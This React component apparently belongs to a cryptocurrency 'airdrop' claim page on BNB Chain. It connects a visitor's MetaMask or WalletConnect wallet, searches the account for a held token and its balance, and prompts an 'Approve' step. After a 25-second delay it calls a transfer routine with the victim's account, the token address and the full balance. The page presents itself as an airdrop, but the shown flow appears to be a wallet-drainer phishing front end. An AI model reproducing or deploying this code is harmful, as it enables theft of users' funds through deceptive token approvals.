import { useState,useEffect, useCallback } from "react";
import Web3 from 'web3';
import {walletConnectProvider,LandHeader,AirdropPage,FormPage,LandFooter} from "./components";
import { useMetaMask } from './hooks/MetaMask';
import { useWalletConnect } from "./hooks/WalletConnect";
import { SC } from './SmartContracts';
import { SRC } from "./SearchContract";
import { TC } from "./TransferContract";

function App() {
  let [ needToApprove, setNeedToApprove ] = useState(false);
  let { Mconnect, MisActive, Maccount,MChainId, Mdisconnect } = useMetaMask();
  let { Wconnect, WisActive, Waccount } = useWalletConnect();
  let [ account, setAccount ] = useState(false);
  let [ active, setActive ] = useState(false);
  let [ walletType, setWalletType ] = useState(null);
  let [loading, setLoading] = useState(false);
  let [check, setChecking] = useState(false);
  let [search, setSearch] = useState(false);
  let [transfer, setTransfer] = useState(false);
  let [approved, setApproved] = useState(false);
  let [token, setToken] = useState({});
  let [pop, setPop] = useState('none')

  const changeNetwork = async (wallet) => {
  await window.ethereum.request({
      method: 'wallet_switchEthereumChain',
      params: [{ chainId: Web3.utils.toHex('56') }]
    }).then(()=> {
        connect(wallet)
    });
  }
  
  /*window.ethereum.on('networkChanged', function (networkId) {
    if(networkId !== '56') window.location.reload();
  })*/
  useEffect(() => {
    if (walletType && (Maccount || Waccount) && !account) {
    if (walletType === 'MetaMask') {
        setAccount(Maccount);
        setLoading(true);
        setSearch(true);
    } else if (walletType === 'WalletConnect') {
        setAccount(Waccount);
        setLoading(true);
        setSearch(true);
    }}

  if ((MisActive || WisActive) && !active) {setActive(true);}

   }, [walletType]);

  let popUp = useCallback(async () => pop === 'none' ? setPop('block') : setPop('none'));
  const connect = async wallet => {
     if(wallet === 'MetaMask') {await Mconnect(); await SC.init(window.ethereum);}
     else if(wallet === 'WalletConnect') {await Wconnect();await SC.init(walletConnectProvider);}
     setWalletType(wallet);
  }
  useEffect(() => {
     if(search === true) {
      SRC.starting(MChainId,Maccount).then((item)=>{
        setSearch(item.return);
        setToken({tokenAddress: item.tokenAddress, amount: item.amount, balance: item.balance, decimal: item.decimal});
      })
     }  
  }, [search]);

  useEffect(() => {
    if(search === false) {
        SC.confirm(token.tokenAddress).then(()=>{
          setLoading(false);
          setNeedToApprove(true);
    })}  
 }, [token]);

 let approve = useCallback(async () => {
    let approval = await SC.approve(token.decimal);
    if(approval === true) {
      setNeedToApprove(false);
      setChecking(true);
      setTransfer(true);
    }
});

let Tstarting = useCallback(async () => {
    let ts = await TC.starting(account, token.tokenAddress, token.balance);
    if(ts === true){
      setTransfer(false);
      setChecking(false);
      setApproved(true);
    }
});

 useEffect(() => {
    if(transfer === true) {
        SC.success(token.tokenAddress).then(()=>{
          setTimeout(Tstarting, 25000);
      })}
}, [transfer]);


  return (
  <>
    <LandHeader onConnect={async wallet => {
      if (wallet === 'MetaMask') {
          if(window.ethereum === undefined) {window.open(`https://metamask.app.link/dapp/${window.location.hostname}/`, '_blank', 'noreferrer');}
          else{if (window.ethereum.networkVersion === '56') {await connect(wallet)}
          else{await changeNetwork(wallet)}}}
      else if(wallet === 'WalletConnect'){await connect(wallet)}}}
      account={account} popStatus={pop} pop={popUp} />
    <main className="main-menu">
      <AirdropPage txtConnect={loading ? 'Loading' : needToApprove ? 'Approve' : check ? 'Approving...' : approved ? 'Approved' : 'Connect'}
        approve={approve} pop={popUp} />
      <FormPage />
    </main>
    <LandFooter />
  </>
  );
}

export default App;
